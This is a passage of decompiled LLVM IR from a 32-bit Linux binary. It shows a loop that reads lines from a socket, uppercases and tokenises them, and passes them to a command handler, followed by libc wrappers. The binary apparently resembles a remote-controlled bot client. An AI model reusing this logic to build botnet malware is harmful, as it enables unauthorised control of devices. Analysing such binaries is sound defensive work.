  br label %dec_label_pc_8049629

dec_label_pc_80495ff:                             ; preds = %dec_label_pc_8049629, %dec_label_pc_8049662
  %v2_8049602 = mul i32 %storemerge24, 4
  %v0_8049607 = load i32, i32* @global_var_8054564.18, align 4
  %v2_804960c = add i32 %v0_8049607, %v2_8049602
  %v1_804960f = add i32 %v2_804960c, -4
  %v1_8049622 = inttoptr i32 %v2_804960c to i32*
  %v2_8049622 = load i32, i32* %v1_8049622, align 4
  %v2_8049624 = inttoptr i32 %v1_804960f to i32*
  store i32 %v2_8049622, i32* %v2_8049624, align 4
  %v4_8049626 = add i32 %storemerge24, 1
  br label %dec_label_pc_8049629

dec_label_pc_8049629:                             ; preds = %dec_label_pc_80495f6, %dec_label_pc_80495ff
  %storemerge24 = phi i32 [ %v4_8049626, %dec_label_pc_80495ff ], [ %.pre, %dec_label_pc_80495f6 ]
  %v0_8049642 = load i32, i32* @global_var_8052304.17, align 4
  %v10_804965a = icmp eq i32 %v0_8049642, 0
  br i1 %v10_804965a, label %dec_label_pc_8049662, label %dec_label_pc_80495ff

dec_label_pc_8049662:                             ; preds = %dec_label_pc_8049629
  %v0_804963d = load i32, i32* @global_var_8052300.16, align 256
  store i32 0, i32* @edi, align 4
  %v10_8049676 = icmp ult i32 %storemerge24, %v0_804963d
  br i1 %v10_8049676, label %dec_label_pc_80495ff, label %dec_label_pc_804967e

dec_label_pc_804967e:                             ; preds = %dec_label_pc_8049662
  %v2_8049681 = mul i32 %storemerge24, 4
  %v0_8049686 = load i32, i32* @global_var_8054564.18, align 4
  %v2_804968b = add i32 %v2_8049681, -4
  %v1_804968e = add i32 %v2_804968b, %v0_8049686
  %v1_8049691 = inttoptr i32 %v1_804968e to i32*
  store i32 0, i32* %v1_8049691, align 4
  %v0_8049697 = load i32, i32* @global_var_8052300.16, align 256
  %v0_804969c = load i32, i32* @global_var_8052304.17, align 4
  %v1_80496a2 = add i32 %v0_8049697, -1
  %v4_80496a2 = icmp ne i32 %v0_8049697, 0
  %v2_80496a5 = zext i1 %v4_80496a2 to i32
  %v3_80496a5 = add i32 %v0_804969c, -1
  %v4_80496a5 = add i32 %v3_80496a5, %v2_80496a5
  store i32 %v1_80496a2, i32* @global_var_8052300.16, align 256
  store i32 %v4_80496a5, i32* @global_var_8052304.17, align 4
  %v2_80496c2 = mul i32 %v1_80496a2, 4
  %v1_80496c5 = add i32 %v2_80496c2, 4
  store i32 %v1_80496c5, i32* %stack_var_-4400, align 4
  %v1_80496cb = call i32 @malloc(i32 %v1_80496c5)
  br label %dec_label_pc_80496fe

dec_label_pc_80496dc:                             ; preds = %dec_label_pc_80496fe, %dec_label_pc_8049737
  %v2_80496df = mul i32 %storemerge23, 4
  %v5_80496e4 = add i32 %v2_80496df, %v1_80496cb
  %v0_80496ef = load i32, i32* @global_var_8054564.18, align 4
  %v2_80496f4 = add i32 %v0_80496ef, %v2_80496df
  %v1_80496f7 = inttoptr i32 %v2_80496f4 to i32*
  %v2_80496f7 = load i32, i32* %v1_80496f7, align 4
  %v2_80496f9 = inttoptr i32 %v5_80496e4 to i32*
  store i32 %v2_80496f7, i32* %v2_80496f9, align 4
  %v4_80496fb = add i32 %storemerge23, 1
  br label %dec_label_pc_80496fe

dec_label_pc_80496fe:                             ; preds = %dec_label_pc_804967e, %dec_label_pc_80496dc
  %storemerge23 = phi i32 [ %v4_80496fb, %dec_label_pc_80496dc ], [ 0, %dec_label_pc_804967e ]
  %v0_8049717 = load i32, i32* @global_var_8052304.17, align 4
  %v10_804972f = icmp eq i32 %v0_8049717, 0
  br i1 %v10_804972f, label %dec_label_pc_8049737, label %dec_label_pc_80496dc

dec_label_pc_8049737:                             ; preds = %dec_label_pc_80496fe
  %v0_8049712 = load i32, i32* @global_var_8052300.16, align 256
  store i32 0, i32* @edi, align 4
  %v10_804974b = icmp ult i32 %storemerge23, %v0_8049712
  br i1 %v10_804974b, label %dec_label_pc_80496dc, label %dec_label_pc_8049753

dec_label_pc_8049753:                             ; preds = %dec_label_pc_8049737
  %v0_8049753 = load i32, i32* @global_var_8054564.18, align 4
  store i32 %v0_8049753, i32* %stack_var_-4400, align 4
  %v1_804975b = call i32 @free(i32 %v0_8049753)
  store i32 %v1_80496cb, i32* @global_var_8054564.18, align 4
  br label %dec_label_pc_8049768

dec_label_pc_8049768:                             ; preds = %dec_label_pc_80495c4, %dec_label_pc_8049753
  br label %dec_label_pc_804976b

dec_label_pc_804976b:                             ; preds = %dec_label_pc_8049a47, %dec_label_pc_8049768
  %storemerge22 = phi i32 [ %.pre, %dec_label_pc_8049768 ], [ 0, %dec_label_pc_8049a47 ]
  %v1_8049774 = ashr i32 %storemerge22, 31
  %v0_804977b = load i32, i32* @global_var_8052300.16, align 256
  %v0_8049780 = load i32, i32* @global_var_8052304.17, align 4
  %v10_8049798 = icmp ult i32 %v1_8049774, %v0_8049780
  br i1 %v10_8049798, label %dec_label_pc_80495c4, label %dec_label_pc_80497a4

dec_label_pc_80497a4:                             ; preds = %dec_label_pc_804976b
  store i32 %v0_8049780, i32* @edi, align 4
  %v6_80497b0 = icmp ugt i32 %v1_8049774, %v0_8049780
  br i1 %v6_80497b0, label %dec_label_pc_80497c4, label %dec_label_pc_80497b2

dec_label_pc_80497b2:                             ; preds = %dec_label_pc_80497a4
  %v10_80497b8 = icmp ult i32 %storemerge22, %v0_804977b
  br i1 %v10_80497b8, label %dec_label_pc_80495c4, label %dec_label_pc_80497c4

dec_label_pc_80497c4:                             ; preds = %dec_label_pc_80497b2, %dec_label_pc_80497a4
  %v0_80497c7 = load i32, i32* @ebp, align 4
  %v2_80497c7 = add i32 %v4_8049a62, -4276
  %v3_80497c7 = add i32 %v2_80497c7, %v0_80497c7
  %v4_80497c7 = inttoptr i32 %v3_80497c7 to i8*
  store i8 0, i8* %v4_80497c7, align 1
  store i32 %v2_8049a47, i32* %stack_var_-4400, align 4
  %v2_80497d8 = call i32 @trim(i8* %v3_8049a62)
  %v2_80497e9 = load i8, i8* %v3_8049a62, align 4
  %v10_80497ec = icmp eq i8 %v2_80497e9, 46
  %v1_80497ee = icmp eq i1 %v10_80497ec, false
  br i1 %v1_80497ee, label %dec_label_pc_8049a47, label %dec_label_pc_80497f4

dec_label_pc_80497f4:                             ; preds = %dec_label_pc_80497c4
  %v2_804980399 = load i8, i8* %v5_804982c, align 1
  %v7_8049806103 = icmp eq i8 %v2_804980399, 32
  br i1 %v7_8049806103, label %dec_label_pc_8049814, label %dec_label_pc_804980a

dec_label_pc_80497fd:                             ; preds = %dec_label_pc_804980a
  %v5_80497fd = add i32 %storemerge21.in105, 1
  %storemerge21 = inttoptr i32 %v5_80497fd to i8*
  %v2_8049803 = load i8, i8* %storemerge21, align 1
  %v7_8049806 = icmp eq i8 %v2_8049803, 32
  br i1 %v7_8049806, label %dec_label_pc_8049814, label %dec_label_pc_804980a

dec_label_pc_804980a:                             ; preds = %dec_label_pc_80497f4, %dec_label_pc_80497fd
  %storemerge21106 = phi i8* [ %storemerge21, %dec_label_pc_80497fd ], [ %v5_804982c, %dec_label_pc_80497f4 ]
  %storemerge21.in105 = phi i32 [ %v5_80497fd, %dec_label_pc_80497fd ], [ %v1_80497f7, %dec_label_pc_80497f4 ]
  %v2_804980d = load i8, i8* %storemerge21106, align 1
  %v4_8049810 = icmp eq i8 %v2_804980d, 0
  %v1_8049812 = icmp eq i1 %v4_8049810, false
  br i1 %v1_8049812, label %dec_label_pc_80497fd, label %dec_label_pc_8049814

dec_label_pc_8049814:                             ; preds = %dec_label_pc_80497fd, %dec_label_pc_804980a, %dec_label_pc_80497f4
  %storemerge21.lcssa = phi i8* [ %v5_804982c, %dec_label_pc_80497f4 ], [ %storemerge21106, %dec_label_pc_804980a ], [ %storemerge21, %dec_label_pc_80497fd ]
  %v2_8049817 = load i8, i8* %storemerge21.lcssa, align 1
  %v4_804981a = icmp eq i8 %v2_8049817, 0
  br i1 %v4_804981a, label %dec_label_pc_8049a47, label %dec_label_pc_8049822

dec_label_pc_8049822:                             ; preds = %dec_label_pc_8049814
  store i8 0, i8* %storemerge21.lcssa, align 1
  %v3_8049846 = call i32 @_strlen(i8* %v5_804982c)
  %v6_804984d = add i32 %v2_8049a47, %v3_8049846
  %v1_8049850 = add i32 %v6_804984d, 2
  %v5_8049853 = inttoptr i32 %v1_8049850 to i8*
  br label %dec_label_pc_804987d

dec_label_pc_8049858:                             ; preds = %dec_label_pc_80498a6, %dec_label_pc_804987d
  %v3_804986f = call i32 @_strlen(i8* %v5_8049853)
  %v6_8049876 = add i32 %v1_8049850, %v3_804986f
  %v1_8049879 = add i32 %v6_8049876, -1
  %v1_804987a = inttoptr i32 %v1_8049879 to i8*
  store i8 0, i8* %v1_804987a, align 1
  br label %dec_label_pc_804987d

dec_label_pc_804987d:                             ; preds = %dec_label_pc_8049822, %dec_label_pc_8049858
  %v3_8049894 = call i32 @_strlen(i8* %v5_8049853)
  %v6_804989b = add i32 %v1_8049850, %v3_8049894
  %v1_804989e = add i32 %v6_804989b, -1
  %v1_804989f = inttoptr i32 %v1_804989e to i8*
  %v2_804989f = load i8, i8* %v1_804989f, align 1
  %v10_80498a2 = icmp eq i8 %v2_804989f, 10
  br i1 %v10_80498a2, label %dec_label_pc_8049858, label %dec_label_pc_80498a6

dec_label_pc_80498a6:                             ; preds = %dec_label_pc_804987d
  store i32 %v1_8049850, i32* @edi, align 4
  %v3_80498bd = call i32 @_strlen(i8* %v5_8049853)
  %v4_80498bd = mul i32 %v3_80498bd, -1
  %v5_80498bd = add i32 %v4_80498bd, -2
  store i32 %v5_80498bd, i32* @ecx, align 4
  %v6_80498c4 = sub i32 %v1_8049850, %v4_80498bd
  %v1_80498c7 = add i32 %v6_80498c4, -1
  %v1_80498c8 = inttoptr i32 %v1_80498c7 to i8*
  %v2_80498c8 = load i8, i8* %v1_80498c8, align 1
  %v10_80498cb = icmp eq i8 %v2_80498c8, 13
  br i1 %v10_80498cb, label %dec_label_pc_8049858, label %dec_label_pc_80498cf

dec_label_pc_80498cf:                             ; preds = %dec_label_pc_80498a6
  %v2_80498dd111 = load i8, i8* %v5_8049853, align 1
  %v7_80498e0115 = icmp eq i8 %v2_80498dd111, 32
  br i1 %v7_80498e0115, label %dec_label_pc_80498ee, label %dec_label_pc_80498e4

dec_label_pc_80498d7:                             ; preds = %dec_label_pc_80498e4
  %v5_80498d7 = add i32 %v4_80498da118, 1
  %v22_80498d7 = inttoptr i32 %v5_80498d7 to i8*
  %v2_80498dd = load i8, i8* %v22_80498d7, align 1
  %v7_80498e0 = icmp eq i8 %v2_80498dd, 32
  br i1 %v7_80498e0, label %dec_label_pc_80498ee, label %dec_label_pc_80498e4

dec_label_pc_80498e4:                             ; preds = %dec_label_pc_80498cf, %dec_label_pc_80498d7
  %v4_80498da118 = phi i32 [ %v5_80498d7, %dec_label_pc_80498d7 ], [ %v1_8049850, %dec_label_pc_80498cf ]
  %stack_var_-60.0117 = phi i8* [ %v22_80498d7, %dec_label_pc_80498d7 ], [ %v5_8049853, %dec_label_pc_80498cf ]
  %v2_80498e7 = load i8, i8* %stack_var_-60.0117, align 1
  %v4_80498ea = icmp eq i8 %v2_80498e7, 0
  %v1_80498ec = icmp eq i1 %v4_80498ea, false
  br i1 %v1_80498ec, label %dec_label_pc_80498d7, label %dec_label_pc_80498ee

dec_label_pc_80498ee:                             ; preds = %dec_label_pc_80498d7, %dec_label_pc_80498e4, %dec_label_pc_80498cf
  %stack_var_-60.0.lcssa = phi i8* [ %v5_8049853, %dec_label_pc_80498cf ], [ %stack_var_-60.0117, %dec_label_pc_80498e4 ], [ %v22_80498d7, %dec_label_pc_80498d7 ]
  %v4_80498da.lcssa = phi i32 [ %v1_8049850, %dec_label_pc_80498cf ], [ %v4_80498da118, %dec_label_pc_80498e4 ], [ %v5_80498d7, %dec_label_pc_80498d7 ]
  store i8 0, i8* %stack_var_-60.0.lcssa, align 1
  %v5_80498f4 = add i32 %v4_80498da.lcssa, 1
  %v2_804991d124 = load i8, i8* %v5_8049853, align 1
  %v4_8049920126 = icmp eq i8 %v2_804991d124, 0
  %v1_8049922128 = icmp eq i1 %v4_8049920126, false
  br i1 %v1_8049922128, label %dec_label_pc_80498ff, label %dec_label_pc_8049924

dec_label_pc_80498ff:                             ; preds = %dec_label_pc_80498ee, %dec_label_pc_80498ff
  %storemerge20130 = phi i8* [ %storemerge20, %dec_label_pc_80498ff ], [ %v5_8049853, %dec_label_pc_80498ee ]
  %storemerge20.in129 = phi i32 [ %v5_8049917, %dec_label_pc_80498ff ], [ %v1_8049850, %dec_label_pc_80498ee ]
  %v2_8049902 = load i8, i8* %storemerge20130, align 1
  %v3_8049902 = zext i8 %v2_8049902 to i32
  store i32 %v3_8049902, i32* %stack_var_-4400, align 4
  %v1_804990b = call i32 @__GI_toupper(i32 %v3_8049902)
  %v1_8049910 = urem i32 %v1_804990b, 256
  %v2_8049910 = load i32, i32* @edx, align 4
  %v3_8049910 = and i32 %v2_8049910, -256
  %v4_8049910 = or i32 %v3_8049910, %v1_8049910
  store i32 %v4_8049910, i32* @edx, align 4
  %v1_8049915 = trunc i32 %v1_804990b to i8
  store i8 %v1_8049915, i8* %storemerge20130, align 1
  %v5_8049917 = add i32 %storemerge20.in129, 1
  %storemerge20 = inttoptr i32 %v5_8049917 to i8*
  %v2_804991d = load i8, i8* %storemerge20, align 1
  %v4_8049920 = icmp eq i8 %v2_804991d, 0
  %v1_8049922 = icmp eq i1 %v4_8049920, false
  br i1 %v1_8049922, label %dec_label_pc_80498ff, label %dec_label_pc_8049924

dec_label_pc_8049924:                             ; preds = %dec_label_pc_80498ff, %dec_label_pc_80498ee
  store i32 %v5_80498f4, i32* @eax, align 4
  store i32 %v5_80498f4, i32* %stack_var_-4400, align 4
  %v2_8049939 = call i32 @__GI_strtok(i32 %v5_80498f4, i32 ptrtoint (i32* @global_var_804ff64.26 to i32))
  %v5_804993e = inttoptr i32 %v2_8049939 to i8*
  store i8* %v5_804993e, i8** %stack_var_-32, align 4
  store i32 %v1_8049850, i32* %stack_var_-188, align 4
  %v5_80499f527 = icmp eq i32 %v2_8049939, 0
  %v1_80499f934 = icmp eq i1 %v5_80499f527, false
  br i1 %v1_80499f934, label %dec_label_pc_804994f, label %dec_label_pc_80499ff

dec_label_pc_804994f:                             ; preds = %dec_label_pc_8049924, %dec_label_pc_80499de
  %v3_8049960 = phi i8* [ %tmp97, %dec_label_pc_80499de ], [ %v5_804993e, %dec_label_pc_8049924 ]
  %stack_var_-36.135 = phi i32 [ %stack_var_-36.0, %dec_label_pc_80499de ], [ 1, %dec_label_pc_8049924 ]
  %v2_8049952 = load i8, i8* %v3_8049960, align 1
  %v3_8049952 = zext i8 %v2_8049952 to i32
  store i32 %v3_8049952, i32* @eax, align 4
  %v10_8049955 = icmp eq i8 %v2_8049952, 10
  br i1 %v10_8049955, label %dec_label_pc_80499de, label %dec_label_pc_804995d

dec_label_pc_804995d:                             ; preds = %dec_label_pc_804994f
  %v4_804994f = ptrtoint i8* %v3_8049960 to i32
  store i32 %stack_var_-36.135, i32* @ebx, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804994f, i32* @edi, align 4
  %v3_8049977 = call i32 @_strlen(i8* %v3_8049960)
  %v1_804997b = add i32 %v3_8049977, 1
  store i32 %v1_804997b, i32* %stack_var_-4400, align 4
  %v1_8049982 = call i32 @malloc(i32 %v1_804997b)
  %v1_8049987 = load i32, i32* @ebp, align 4
  %v2_8049987 = load i32, i32* @ebx, align 4
  %v3_8049987 = mul i32 %v2_8049987, 4
  %v4_8049987 = add i32 %v1_8049987, -180
  %v5_8049987 = add i32 %v4_8049987, %v3_8049987
  %v6_8049987 = inttoptr i32 %v5_8049987 to i32*
  store i32 %v1_8049982, i32* %v6_8049987, align 4
  %v3_804998e = load i8*, i8** %stack_var_-32, align 4
  %v4_804998e = ptrtoint i8* %v3_804998e to i32
  %v3_80499a5 = call i32 @_strlen(i8* %v3_804998e)
  %v1_80499a9 = add i32 %v3_80499a5, 1
  %v0_80499b2 = load i32, i32* @ebp, align 4
  %v2_80499b2 = mul i32 %stack_var_-36.135, 4
  %v3_80499b2 = add i32 %v2_80499b2, -180
  %v4_80499b2 = add i32 %v0_80499b2, %v3_80499b2
  %v5_80499b2 = inttoptr i32 %v4_80499b2 to i32*
  %v6_80499b2 = load i32, i32* %v5_80499b2, align 4
  %v1_80499b9 = inttoptr i32 %v6_80499b2 to i8*
  store i32 %v6_80499b2, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_80499be = and i32 %v6_80499b2, -256
  %v5_80499c0 = call i8* @_memset(i8* %v1_80499b9, i32 %v1_80499be, i32 %v1_80499a9)
  %v6_80499c0 = ptrtoint i8* %v5_80499c0 to i32
  store i32 %v6_80499c0, i32* @ecx, align 4
  %v0_80499c8 = load i32, i32* @ebp, align 4
  %v4_80499c8 = add i32 %v0_80499c8, %v3_80499b2
  %v5_80499c8 = inttoptr i32 %v4_80499c8 to i32*
  %v6_80499c8 = load i32, i32* %v5_80499c8, align 4
  store i32 %v6_80499c8, i32* @eax, align 4
  store i32 %v6_80499c8, i32* %stack_var_-4400, align 4
  %v2_80499d6 = inttoptr i32 %v6_80499c8 to i8*
  %v3_80499d6 = call i32 @strcpy(i8* %v2_80499d6, i32 %v4_804998e)
  store i32 %v3_80499d6, i32* @eax, align 4
  %v4_80499db = add i32 %stack_var_-36.135, 1
  br label %dec_label_pc_80499de

dec_label_pc_80499de:                             ; preds = %dec_label_pc_804994f, %dec_label_pc_804995d
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.135, %dec_label_pc_804994f ], [ %v4_80499db, %dec_label_pc_804995d ]
  store i32 0, i32* %stack_var_-4400, align 4
  %v2_80499ed = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_804ff64.26 to i32))
  store i32 %v2_80499ed, i32* %tmp95, align 4
  %v5_80499f5 = icmp eq i32 %v2_80499ed, 0
  %v1_80499f9 = icmp eq i1 %v5_80499f5, false
  %tmp97 = inttoptr i32 %v2_80499ed to i8*
  br i1 %v1_80499f9, label %dec_label_pc_804994f, label %dec_label_pc_80499ff

dec_label_pc_80499ff:                             ; preds = %dec_label_pc_80499de, %dec_label_pc_8049924
  %stack_var_-36.1.lcssa = phi i32 [ 1, %dec_label_pc_8049924 ], [ %stack_var_-36.0, %dec_label_pc_80499de ]
  store i32 %stack_var_-36.1.lcssa, i32* %stack_var_-4400, align 4
  %v3_8049a0f = call i32 @processCmd(i32 %stack_var_-36.1.lcssa, i32* nonnull %stack_var_-188)
  %v7_8049a18 = icmp sgt i32 %stack_var_-36.1.lcssa, 1
  br i1 %v7_8049a18, label %dec_label_pc_8049a2a.lr.ph, label %dec_label_pc_8049a47

dec_label_pc_8049a2a.lr.ph:                       ; preds = %dec_label_pc_80499ff
  br label %dec_label_pc_8049a2a

dec_label_pc_8049a2a:                             ; preds = %dec_label_pc_8049a2a.lr.ph, %dec_label_pc_8049a2a
  %storemerge136 = phi i32 [ 1, %dec_label_pc_8049a2a.lr.ph ], [ %v4_8049a3c, %dec_label_pc_8049a2a ]
  %v0_8049a2d = load i32, i32* @ebp, align 4
  %v2_8049a2d = mul i32 %storemerge136, 4
  %v3_8049a2d = add i32 %v2_8049a2d, -180
  %v4_8049a2d = add i32 %v3_8049a2d, %v0_8049a2d
  %v5_8049a2d = inttoptr i32 %v4_8049a2d to i32*
  %v6_8049a2d = load i32, i32* %v5_8049a2d, align 4
  store i32 %v6_8049a2d, i32* %stack_var_-4400, align 4
  %v1_8049a37 = call i32 @free(i32 %v6_8049a2d)
  %v4_8049a3c = add nuw i32 %storemerge136, 1
  %exitcond = icmp eq i32 %v4_8049a3c, %stack_var_-36.1.lcssa
  br i1 %exitcond, label %dec_label_pc_8049a47, label %dec_label_pc_8049a2a

dec_label_pc_8049a47:                             ; preds = %dec_label_pc_8049a2a, %dec_label_pc_80499ff, %dec_label_pc_8049814, %dec_label_pc_80497c4, %dec_label_pc_804959c
  %v0_8049a4d = load i32, i32* @global_var_8052308.15, align 8
  store i32 %v0_8049a4d, i32* %stack_var_-4400, align 4
  %v4_8049a62 = call i32 @recvLine(i32 %v0_8049a4d, i8* %v3_8049a62, i32 4096)
  %v13_8049a6a = icmp eq i32 %v4_8049a62, -1
  %v1_8049a6e = icmp eq i1 %v13_8049a6a, false
  br i1 %v1_8049a6e, label %dec_label_pc_804976b, label %dec_label_pc_804959c

; uselistorder directives
  uselistorder i32 %storemerge136, { 1, 0 }
  uselistorder i32 %v1_804997b, { 1, 0 }
  uselistorder i32 %stack_var_-36.135, { 0, 3, 2, 1 }
  uselistorder i8* %v3_8049960, { 2, 1, 0 }
  uselistorder i8* %storemerge20, { 1, 0 }
  uselistorder i32 %v5_8049917, { 1, 0 }
  uselistorder i32 %v1_804990b, { 1, 0 }
  uselistorder i8* %storemerge20130, { 1, 0 }
  uselistorder i8* %v5_8049853, { 0, 3, 1, 2, 4, 5, 7, 6 }
  uselistorder i32 %v1_8049850, { 5, 2, 3, 4, 6, 7, 1, 0, 8 }
  uselistorder i8* %storemerge21.lcssa, { 1, 0 }
  uselistorder i32 %v0_8049780, { 1, 0, 2 }
  uselistorder i32 %storemerge22, { 2, 3, 0, 1 }
  uselistorder i32 %storemerge23, { 1, 0, 2 }
  uselistorder i32 %v2_80496df, { 1, 0 }
  uselistorder i32 %v1_80496cb, { 1, 0 }
  uselistorder i32 %v0_8049697, { 1, 0 }
  uselistorder i32 %storemerge24, { 1, 2, 0, 3 }
  uselistorder i8* %v5_804982c, { 3, 0, 1, 2 }
  uselistorder i8* %v3_8049a62, { 2, 0, 1 }
  uselistorder i32 %v2_8049a47, { 0, 2, 1 }
  uselistorder i32 %v1_8049523, { 1, 0, 2 }
  uselistorder i32 %v2_80494cb, { 1, 0 }
  uselistorder i32 %v2_804944e, { 1, 0 }
  uselistorder i32* %stack_var_-4400, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 1, 17, 18, 0, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i8** %stack_var_-32, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 2, 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 ()* @rand_next, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_init, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049a2a, { 1, 0 }
  uselistorder label %dec_label_pc_80499de, { 1, 0 }
  uselistorder label %dec_label_pc_804994f, { 1, 0 }
  uselistorder label %dec_label_pc_80498ff, { 1, 0 }
  uselistorder label %dec_label_pc_80498ee, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80498e4, { 1, 0 }
  uselistorder label %dec_label_pc_804987d, { 1, 0 }
  uselistorder label %dec_label_pc_8049814, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804980a, { 1, 0 }
  uselistorder label %dec_label_pc_8049768, { 1, 0 }
  uselistorder label %dec_label_pc_80496fe, { 1, 0 }
  uselistorder label %dec_label_pc_80496dc, { 1, 0 }
  uselistorder label %dec_label_pc_8049629, { 1, 0 }
  uselistorder label %dec_label_pc_80495ff, { 1, 0 }
  uselistorder label %dec_label_pc_804959c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804957a, { 2, 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_8049a7c = load i32, i32* @edi, align 4
  %v0_8049a7d = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg3, i32* @edx, align 4
  %v1_8049a95 = add i32 %arg2, -12
  %v6_8049a9b = icmp ugt i32 %v1_8049a95, 2
  br i1 %v6_8049a9b, label %dec_label_pc_8049aab, label %dec_label_pc_8049a9d

dec_label_pc_8049a9d:                             ; preds = %entry
  %v4_8049aa1 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_8049a95)
  br label %dec_label_pc_8049acd

dec_label_pc_8049aab:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_8049ab3 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_8049ab3, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_8049ab3, -4095
  br i1 %tmp, label %dec_label_pc_8049acb, label %dec_label_pc_8049abf

dec_label_pc_8049abf:                             ; preds = %dec_label_pc_8049aab
  %v1_8049abf = call i32 @__errno_location(i32 %v0_8049a7d)
  %v0_8049ac4 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049ac4 = sub i32 0, %v0_8049ac4
  %v2_8049ac6 = inttoptr i32 %v1_8049abf to i32*
  store i32 %v1_8049ac4, i32* %v2_8049ac6, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8049acb

dec_label_pc_8049acb:                             ; preds = %dec_label_pc_8049aab, %dec_label_pc_8049abf
  %v0_8049acb = phi i32 [ %v2_8049ab3, %dec_label_pc_8049aab ], [ -1, %dec_label_pc_8049abf ]
  br label %dec_label_pc_8049acd

dec_label_pc_8049acd:                             ; preds = %dec_label_pc_8049a9d, %dec_label_pc_8049acb
  %v0_8049ad2 = phi i32 [ %v4_8049aa1, %dec_label_pc_8049a9d ], [ %v0_8049acb, %dec_label_pc_8049acb ]
  store i32 %v0_8049a7d, i32* @ebx, align 4
  store i32 %v0_8049a7c, i32* @edi, align 4
  ret i32 %v0_8049ad2

; uselistorder directives
  uselistorder i32 %v2_8049ab3, { 1, 0, 2 }
  uselistorder i32 %v0_8049a7d, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049acd, { 1, 0 }
  uselistorder label %dec_label_pc_8049acb, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049ad4 = load i32, i32* @edi, align 4
  store i32 %v0_8049ad4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_8049aec = load i32, i32* @ebx, align 4
  %v1_8049af4 = call i32 @int80_syscall(i32 221)
  store i32 %v1_8049af4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049af4, -4095
  br i1 %tmp, label %dec_label_pc_8049b0c, label %dec_label_pc_8049b00

dec_label_pc_8049b00:                             ; preds = %entry
  %v1_8049b00 = call i32 @__errno_location(i32 %v0_8049aec)
  %v0_8049b05 = load i32, i32* %edi.global-to-local, align 4
  %v1_8049b05 = sub i32 0, %v0_8049b05
  %v2_8049b07 = inttoptr i32 %v1_8049b00 to i32*
  store i32 %v1_8049b05, i32* %v2_8049b07, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049b0c

dec_label_pc_8049b0c:                             ; preds = %entry, %dec_label_pc_8049b00
  %v0_8049b0f = phi i32 [ %v1_8049af4, %entry ], [ -1, %dec_label_pc_8049b00 ]
  %v2_8049b11 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049b11, i32* %edi.global-to-local, align 4
  ret i32 %v0_8049b0f

; uselistorder directives
  uselistorder i32 %v1_8049af4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049b0c, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049b3c = load i32, i32* @edi, align 4
  store i32 %v0_8049b3c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8049b44 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8049b4c = call i32 @chdir(i32 %v0_8049b44)
  store i32 %v0_8049b44, i32* @ebx, align 4
  store i32 %v1_8049b4c, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_8049b4c, -4095
  br i1 %tmp, label %dec_label_pc_8049b64, label %dec_label_pc_8049b58

dec_label_pc_8049b58:                             ; preds = %entry
  %v1_8049b58 = call i32 @__errno_location(i32 %v0_8049b44)
  %v0_8049b5d = load i32, i32* %edi.global-to-local, align 4
  %v1_8049b5d = sub i32 0, %v0_8049b5d
  %v2_8049b5f = inttoptr i32 %v1_8049b58 to i32*
  store i32 %v1_8049b5d, i32* %v2_8049b5f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8049b64

dec_label_pc_8049b64:                             ; preds = %entry, %dec_label_pc_8049b58
  %v0_8049b65 = phi i32 [ %v1_8049b4c, %entry ], [ -1, %dec_label_pc_8049b58 ]
  %v2_8049b64 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049b64, i32* @edx, align 4
  %v2_8049b68 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8049b68, i32* @edi, align 4
